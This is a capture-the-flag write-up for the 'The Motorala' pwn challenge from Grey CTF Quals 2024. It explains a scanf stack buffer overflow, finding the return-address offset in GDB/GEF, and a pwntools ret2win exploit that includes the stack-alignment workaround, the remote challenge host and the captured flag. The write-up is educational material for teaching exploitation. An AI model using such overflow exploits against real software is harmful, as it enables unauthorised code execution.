---
title: Grey CTF Quals 24 "The Motorala"
date: 2024-04-24
description: Writeup for pwn/the-motorala from Grey CTF Quals 2024.
categories:
  - pwn
  - x86-64
---

> i bet u wont guess my pin
> 
> Author: Elma

TL;DR - Buffer overflow allowing an overwrite of the return address to a vulnerable function. Simple ret2win challenge but with a stack alignment issue.

<!-- more -->

## Investigating

We're given a binary and a C source file again, looking at it we can see the following areas of interest:

```c title="chall.c" hl_lines="21-25"
...
void view_message() {
	int fd = open("./flag.txt", O_RDONLY);
	char* flag = calloc(0x50, sizeof(char));
	read(fd , flag, 0x50);
	close(fd);
	...
	printf("\n%s\n", flag);
	exit(0);
}

...

void login() {
	char attempt[0x30];
	int count = 5;

	for (int i = 0; i < 5; i++) {
		memset(attempt, 0, 0x30);
		printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
		printf("PIN: ");
		scanf("%s", attempt);
		if (!strcmp(attempt, pin)) {
			view_message();
		}
	}
	...
}
...
```

Pretty similar to the `#!c gets()` overflow, we can see `#!c scanf("%s", attempt)`, which is also vulnerable to buffer overflows. We can use the same technique to find the offset to the return address and overwrite it. To find the offset needed to get to the return address, we can use a cyclic pattern and GDB:

```
$ gdb -q chall
Reading symbols from chall...
(No debugging symbols found in chall)
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  run
...

5 TRIES LEFT.
PIN: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
...

[#0] Id 1, Name: "chall", stopped 0x401564 in login (), reason: SIGSEGV
```

And then we can use GEF's pattern search feature to look for the offset to get past RSP:

```
gef➤  pattern search $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

## Exploitation

So what's next? Well, we need to figure out the address of `#!c view_message()` so we can simply get a flag print. Again, we can just do this in GDB:

```
gef➤  info func view_message
All functions matching regular expression "view_message":

Non-debugging symbols:
0x000000000040138e  view_message
```

So we have the address `#!c 0x40138e` to jump to. So let's test this real quick in GDB (we'll format the address as little-endian since we're on an x86-64 system):

```
gef➤  run < <(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + b"\x8e\x13\x40")')
...
As you breached the final door to TACYERG's hideout, anticipation surged.
Yet, the room defied expectations – disorder reigned, furniture overturned, documents scattered, and the vault empty.
'Yet another dead end,' you muttered under your breath.
As you sighed and prepared to leave, a glint caught your eye: a cellphone tucked away under unkempt sheets in a corner.
Recognizing it as potentially the last piece of evidence you have yet to find, you picked it up with a growing sense of anticipation.
...

[#0] Id 1, Name: "chall", stopped 0x7ffff7e1a89b in buffered_vfprintf (), reason: SIGSEGV
```

So something went wrong, we got a segfault. I was honestly stumped here for a bit, one of my friends tried the same thing and was puzzled as well. After messing around, they tried a different call method. Instead of jumping into the `#!c view_message()` function, they jumped to the existing call to the function inside the `#!c login()` function as seen here:

```c title="chall.c" hl_lines="12"
...
void login() {
	char attempt[0x30];
	int count = 5;

	for (int i = 0; i < 5; i++) {
		memset(attempt, 0, 0x30);
		printf("\e[1;91m%d TRIES LEFT.\n\e[0m", 5-i);
		printf("PIN: ");
		scanf("%s", attempt);
		if (!strcmp(attempt, pin)) {
			view_message();
		}
	}
	...
}
...
```

To find this address, we can use GDB again:

```hl_lines="9"
gef➤  disas login
Dump of assembler code for function login:
	0x000000000040149f <+0>:     endbr64
	0x00000000004014a3 <+4>:     push   rbp
	...
	0x0000000000401537 <+152>:   test   eax,eax
	0x0000000000401539 <+154>:   jne    0x401545 <login+166>
	0x000000000040153b <+156>:   mov    eax,0x0
	0x0000000000401540 <+161>:   call   0x40138e <view_message>
	0x0000000000401545 <+166>:   add    DWORD PTR [rbp-0x4],0x1
	...
	0x0000000000401564 <+197>:   ret
End of assembler dump.
```

So instead of jumping to `#!c 0x40138e` (address of `#!c view_message()`), we can jump to `#!c 0x401540` instead. Testing this address locally worked, so let's put it all together:

```python title="exploit.py"
from pwn import *

p = process('./chall') # (1)

payload  = b'A' * 72     # fill stack until return address
payload += p64(0x401540) # address of the call to view_message()

p.sendlineafter('PIN: ', payload)
print(p.recvall().decode())
```

1. To send the actual payload to the server we can replace this with `#!py remote('challs.nusgreyhats.org', 30211)`.

Let's run it and get the flag:

```hl_lines="12"
$ python exploit.py
[+] Receiving all data: Done (609B)
[*] Closed connection to challs.nusgreyhats.org port 30211

After five unsuccessful attempts, the phone begins to emit an alarming heat, escalating to a point of no return. In a sudden burst of intensity, it explodes, sealing your fate.


After several intense attempts, you successfully breach the phone's defenses.
Unlocking its secrets, you uncover a massive revelation that holds the power to reshape everything.
The once-elusive truth is now in your hands, but little do you know, the plot deepens, and the journey through the clandestine hideout takes an unexpected turn, becoming even more complicated.

grey{g00d_w4rmup_for_p4rt_2_hehe}
```

And that's the flag!

???+ quote "Post Challenge Thoughts"
	After the competition, I checked to see if anyone else had similar issues. The author mentioned in the Discord:
	> moto 1 has stack alignment issues, so you have to do an extra step of padding your payload with a single ret

	Looking into the [official writeup](https://github.com/NUSGreyhats/greyctf24-challs-public/blob/main/quals/pwn/the-motorala/solution/solve.py), they did this by doing the following:
	```python
	payload  = b"A"*72       # fill stack until return address
	payload += p64(0x40101a) # address to a ret in <_init>
	payload += p64(0x40138e) # address of view_message()
	```

	Looking more into this on my own time, I found a pretty [good resource on stack alignment issues](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/stack-alignment)